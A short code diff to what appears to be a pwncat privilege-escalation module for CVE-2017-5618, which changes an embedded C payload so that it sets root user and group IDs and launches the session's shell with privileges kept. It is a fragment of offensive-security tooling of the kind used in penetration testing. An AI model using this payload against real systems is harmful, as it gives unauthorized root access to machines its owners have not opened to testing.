@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-import re
 import textwrap
 import subprocess
 from io import StringIO
 
+import pwncat
 from pwncat.facts import ExecuteAbility
 from pwncat.modules import ModuleFailed
 from pwncat.platform import PlatformError
@@ -31,7 +31,7 @@ class CVE_2017_5618(ExecuteAbility):
                 int main(void){{
                     setreuid(0,0);
                     setregid(0,0);
-                    const char* x[] = {{"/bin/sh","-p",NULL}};
+                    const char* x[] = {{"{session.platform.shell}","-p",NULL}};
                     execvp(x[0], x);
                 }}
                 """
